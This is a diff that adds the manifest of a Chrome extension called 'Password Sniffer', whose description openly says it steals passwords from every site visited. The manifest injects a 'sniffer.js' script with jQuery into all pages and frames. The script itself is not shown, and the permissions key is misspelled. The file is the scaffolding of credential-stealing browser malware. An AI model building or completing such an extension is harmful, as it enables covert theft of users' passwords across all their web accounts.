@@ -1,0 +1,16 @@
+{
+	"name"			: "Password Sniffer",
+	"version"		: "1.0",
+	"description"	: "Steals your passwords from all the sites you visit",
+	"minimum_chrome_version"	: "10",
+	"persmissions"	: ["*://*"],
+	"background_page"	: "background.html",
+	"content_scripts"	: [
+		{
+			"matches"		: ["*://*/*"],
+			"js"			: ["jquery.js", "sniffer.js"],
+			"run_at"		: "document_idle",
+			"all_frames"	: true
+		}
+	]
+}
